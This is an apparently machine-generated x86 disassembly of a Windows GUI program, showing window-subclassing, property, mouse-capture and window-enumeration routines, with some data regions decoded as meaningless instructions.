add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ah
cwde
sub_449bff
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax - 0x36 ] dh
inc esp
add [ esp + edx * 8 ] bl
inc esp
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax + edx * 2 + 0x45 ] ah
add [ eax - 0x4bffbb1b ] bh
in eax 0x44
add [ esi - 0x3687ffbc ] al
inc esp
add [ eax + edx * 8 - 0x2fdfffbc ] bh
inc esp
add [ eax - 0x27 ] cl
inc esp
add al al
enter 0x44 0xc4
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
add [ eax + ebp * 8 - 0x68fffbc ] dh
inc esp
add [ eax ] cl
fild [ eax + eax + 0x7c ]
fild [ eax + eax - 0x10 ]

sub_44a074
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov esp 0x280044a0
add [ eax ] al
add al bl
adc [ eax ] al
movsb [ edi ] [ esi ]
xor eax [ eax ]
mov al 0x33
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
xor [ fs : eax ] eax
or [ esp + eax * 2 + 0x6f ] edx
arpl [ ebx + 0x5a ] bp
outsd
outsb
mov eax eax
int3
sub_44a164
inc esp
mov eax [ 0xffffffffa14e0044 ]
inc esp
add [ eax - 0x5f ] bl
inc esp
add cl cl
mov al [ 0xffffffffa0d10044 ]
inc esp
add cl bl
mov al [ 0xffffffffa0e10044 ]
inc esp
add dh ch
mov al [ 0xffffffffa0fb0044 ]
inc esp
add [ eax ] cl
mov eax [ 0xffffffffa1150044 ]
inc esp
add [ edx ] ah
mov eax [ 0xffffffffa12f0044 ]
inc esp
add [ ecx ] bh
inc esp
add [ ecx ] al
add [ eax ] al
add [ ecx - 0x3 ] bh
sbb [ esi + 0x11d1c281 ] eax
stosb [ edi ]
pushad
add al al
dec edi
mov [ 0xffffffffa164e870 ] eax
inc esp
add [ eax + eax ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] cl
mov [ 0xffffffffa19c0044 ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] dh
inc esp
add [ eax ] bh
add [ eax ] al
int3
sub_44a1fd
push edi
inc eax
add [ eax ] ch
xor [ eax ] eax
inc eax
inc ebp
add [ esp + 0x660c0045 ] dl
inc ebp
add [ esi ] bl
inc ebp
add ah bl
insd
inc ebp
add ah al
jo r-xdata
mov [ edx + 0x280044 ] fs
add [ eax ] al
add [ ebx + esi * 2 ] al
inc ebp
add [ eax ] cl
jne r-xdata
fcom [ eax ]
inc eax
add [ ebx + esi + 0x33b00040 ] ah
add [ edx + edi * 2 ] cl
inc ebp
add al al
ja r-xdata
inc eax
add [ ebx + esi + 0x33b80040 ] dh
inc eax
add [ ebx + esi + 0x310c0040 ] ch
inc eax
add [ eax ] ch
xor [ eax ] eax
hlt
mov al 0x33
add al bl
bound eax [ ebp ]
mov al [ 0x9004571 ]
push esp
inc esp
outsd
arpl [ ebx + 0x54 ] bp
jb r-xdata
add [ eax ] al
call sub_44e74c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
mov [ 0x2080044 ] eax
add [ eax ] al
rcl [ edi + 0x11380044 ] 0x1
inc edx
add [ eax - 0x73ffbfcd ] dh
or al [ edx ]
mov eax 0x94004033
sbb [ ebp ] eax
or al 0x31
inc eax
add [ eax ] ch
xor [ eax ] eax
insb
cld
inc esp
add [ ecx + ecx * 2 ] dh
inc ebp
add [ ecx + edx + 0x45 ] bl
add [ eax - 0x75 ] dh
inc ecx
add al dh
test [ eax + eax + 0x4 ] 0xcb
inc esp
add [ eax ] dl
inc [ eax + eax + 0x1c ]
aam 0x44
add [ eax + 0x11 ] dl
inc edx
add [ eax ] bh
push cs
inc edx
add [ eax ] dh
push cs
inc edx
add [ eax + 0x11 ] bl
inc edx
add [ eax - 0x5 ] cl
inc esp
add [ eax + 0x44 ] cl
inc ebp
add [ ecx + ecx * 2 + 0x45 ] ah
add [ eax + 0x78004548 ] dh
leave
inc esp
add ah al
inc ebp
add ah ah
inc ebp
add ah bh
cmp eax [ ebp ]
ror al 0x44
add ah al
enter 0x44 0xc0
clc
inc esp
add ah ch
clc
inc esp
add [ esp + edx * 8 ] al
inc esp
add [ edx + ecx * 8 ] bh
inc esp
add [ eax + 0x80044d5 ] dl
aad 0x44
add [ eax + ebx * 8 ] bl
inc esp
add al cl
salc
inc esp
mov eax eax
mov [ edx + 0x44 ] fs
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] dh
sbb [ ebp ] al
jo r-xdata
inc esp
add [ eax + 0x3c ] dl
inc ebp
add [ edi + 0x38080045 ] cl
inc ebp
add al dh
cmp al 0x45
add [ eax + 0x1c0044fe ] cl
add eax 0x12bc0045
inc ebp
add [ eax - 0x5bffbaf4 ] ch
cmovne eax [ eax ]
aam 0xd
inc ebp
add [ ebx + edx + 0x45 ] dl
add [ eax + 0x13 ] bl
inc ebp
add [ eax ] dl
adc al [ ebp ]
mov eax 0x30004511
inc ebp
add [ eax ] al
sbb al 0x45
add [ eax + edx * 2 ] ah
inc ebp
add [ edx + edi + 0x3d9c0045 ] ch
inc ebp
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
add al 0x8e
inc ebp
add [ eax + 0x12004029 ] ch
add [ eax + 0x6a ] dl
cld
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
add [ eax ] eax
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
inc ebx
insb
nop
call 0x744e88c
adc dl [ ebx + eax * 2 + 0x75 ]
jae r-xdata
add [ eax + 0x74 ] al
push ds
outsd
insd
dec esp
imul esi [ ebx + 0x74 ] 0x746e6f43
jb r-xdata
inc ebp
or [ eax - 0x18 ] dl
inc esi
retn
insb
loopne r-xdata
push esp
inc ebx
jne r-xdata
lodsb [ esi ]
cmp al [ ebp ]
pushfd
cmp eax 0x29a80045
inc eax
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ eax - 0x57ffbfd7 ] ch
sub [ eax ] eax
test al 0x29
inc eax
add [ eax + 0x4004029 ] ch
mov es [ ebp ]
test al 0x29
inc eax
add [ edx ] dl
inc esp
add [ ebx + ebx * 4 + 0xb0044 ] al
or [ ebx + 0x6f ] al
outsb
je r-xdata
or [ eax - 0x18 ] dl
adc eax ebp
sti
jmp [ ecx + rw-data ]
outsd
insb
jae r-xdata
add [ ebp + 0x108a0040 ] cl
sub dl 0x1
jb r-xdata
mov [ eax ] 0x1
retn
je r-xdata
mov [ eax ] 0x0
jmp r-xdata
retn
sub_44a428
push ebp
mov ebp esp
push ecx
push ebx
lea ebx [ ebp - 0x4 ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
mov [ eax + 0x180 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x18c ]
push eax
push 0xfffffffc
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
push 0xfffffff0
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
mov eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call SetPropA
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ rw-data ]
mov [ rw-data ] 0x0
call [ eax + 0x18c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
pop ebx
pop ecx
pop ebp
retn 0x10
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
push 0xfffffff4
mov eax [ ebp + 0x8 ]
push eax
call SetWindowLongA
sub_44a4e0
push ebx
push ecx
mov ebx eax
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
xor eax eax
pop edx
pop ebx
retn
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
push 0x0
push 0x0
mov eax [ rw-data ]
push eax
push ebx
call SendMessageA
pop edx
pop ebx
retn
sub_44a514
push ebx
push esi
push ecx
mov ebx eax
xor esi esi
test ebx ebx
je r-xdata
mov eax esi
pop edx
pop esi
pop ebx
retn
push esp
push ebx
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_4043ac
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax ebx
call sub_44a4e0
mov esi eax
movzx eax [ rw-data ]
push eax
push ebx
call GetPropA
mov esi eax
jmp r-xdata
sub_44a570
push ebx
push esi
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
push ecx
push edx
push eax
mov eax [ rw-data ]
push esi
call SendMessageA
pop esi
pop ebx
retn
sub_44a754
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c370
mov ebx eax
test ebx ebx
jne r-xdata
push edi
mov ecx ebx
dec ecx
mov edx 0x1
mov eax esi
call sub_40440c
mov eax edi
mov edx esi
call sub_403f40
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a798
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax r-xdata
call sub_40c370
mov ebx eax
test ebx ebx
jne r-xdata
push edi
lea edx [ ebx + 0x1 ]
mov ecx 0x7fffffff
mov eax esi
call sub_40440c
mov eax edi
mov edx esi
call sub_403f40
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_44a804
push ebx
mov ebx eax
call ReleaseCapture
xor eax eax
mov [ rw-data ] eax
test ebx ebx
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_403300
test al al
jne r-xdata
mov eax ebx
call sub_453e1c
push eax
call SetCapture
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov [ rw-data ] ebx
mov ebx [ ebx + 0x30 ]
sub_44a8b0
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
jmp r-xdata
mov edx [ ebx ]
cmp edx [ esi + 0x8 ]
jl r-xdata
mov edx [ ebx ]
mov eax esi
call sub_4182a8
cmp edi [ eax + 0x4 ]
sete al
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
inc [ ebx ]
sub_44a8e4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_453e1c
mov ebx eax
test eax eax
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn
mov ebx eax
push eax
call GetParent
test eax eax
jne r-xdata
sub_44a90c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax 0x8
call sub_4026f4
mov ebx eax
mov eax [ ebp - 0x4 ]
mov [ ebx ] eax
push ebp
call sub_44a8e4
pop ecx
mov edi eax
mov [ ebx + 0x4 ] edi
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax esi
call sub_44a8b0
test al al
je r-xdata
mov edx ebx
mov eax esi
call sub_41814c
mov ecx ebx
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_418324
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44a968
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
call sub_418180
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4182a8
mov edx 0x8
call sub_402714
inc esi
dec ebx
jne r-xdata
sub_44a99c
push ebx
push esi
push edi
push ecx
mov ebx eax
xor edi edi
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax edi
pop edx
pop edi
pop esi
pop ebx
retn
dec eax
jne r-xdata
call GetDesktopWindow
push eax
call GetTopWindow
mov esi eax
jmp r-xdata
xor edx edx
mov eax ebx
call sub_4182a8
mov edi [ eax ]
jmp r-xdata
test edi edi
jne r-xdata
test esi esi
jne r-xdata
mov ecx esp
mov edx esi
mov eax ebx
call sub_44a8b0
test al al
je r-xdata
push 0x2
push esi
call __imp_GetWindow
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ esp ]
mov eax [ eax + edx * 4 ]
mov edi [ eax ]
jmp r-xdata
sub_44aa00
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x14 ]
mov [ eax + 0x14 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x24 ]
mov [ eax + 0x24 ] ecx
mov ecx [ edx + 0x28 ]
mov [ eax + 0x28 ] ecx
mov ecx [ edx + 0x2c ]
mov [ eax + 0x2c ] ecx
retn
sub_44aa60
push ebx
push esi
add esp 0xffffff00
mov esi edx
mov ebx eax
mov edx esp
mov eax [ ebx ]
call sub_4030c4
mov edx esp
mov eax esi
call sub_404150
add esp 0x100
pop esi
pop ebx
retn
sub_44aa9c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44ab66
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x215
jg r-xdata
sub eax 0xbd00
je r-xdata
je r-xdata
mov eax [ ebx + 0x4 ]
sub eax 0x11
je r-xdata
dec eax
je r-xdata
xor eax eax
call sub_44bbbc
jmp r-xdata
sub eax 0x200
je r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44b544
jmp r-xdata
sub eax 0xa
je r-xdata
cmp [ ebx + 0x4 ] 0x11
jne r-xdata
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406a9c
lea eax [ ebp - 0xc ]
push eax
mov eax [ rw-data ]
push eax
call ClientToScreen
lea eax [ ebp - 0xc ]
call sub_44b544
jmp r-xdata
sub eax 0x2
je r-xdata
mov [ ebx + 0xc ] 0x1
xor eax eax
call sub_44bbbc
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_44b544
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_44bbbc
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_44ab6b
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_46dc5c
call sub_4039a4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_44bbbc
sub_44abc4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44abee
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_44ac54
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44aa00
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_44ac80
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_403370
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_44acac
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_403370
xor edx edx
sub_44ad04
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_455a84
sub_44ad24
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_455a6c
sub_44ad48
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44ac30
mov dl 0x1
mov eax [ r-xdata ]
call sub_424068
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_429254
mov edx eax
mov eax esi
call sub_4241e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034c0
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403518
pop [ fs : 0x0 ]
add esp 0xc
sub_44adac
push ebx
push esi
call sub_403528
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_403174
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403164
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403510
sub_44addc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44ac54
mov eax esi
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_44ae38
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_403370
pop edi
pop esi
pop ebp
retn 0x4
sub_44ae5c
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_44ae80
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44ae5c
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_44ae5c
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_44af3c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_44afa8
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_44b3f8
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_44a514
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_453e1c
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_453e1c
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_453e1c
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_403370
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_44af3c
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_453e1c
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_453e1c
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_44b140
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403300
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_453e1c
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_453e1c
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_44b184
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_44a99c
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_44afa8
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4182a8
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_453e1c
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_44b140
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_403370
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_45294c
dec eax
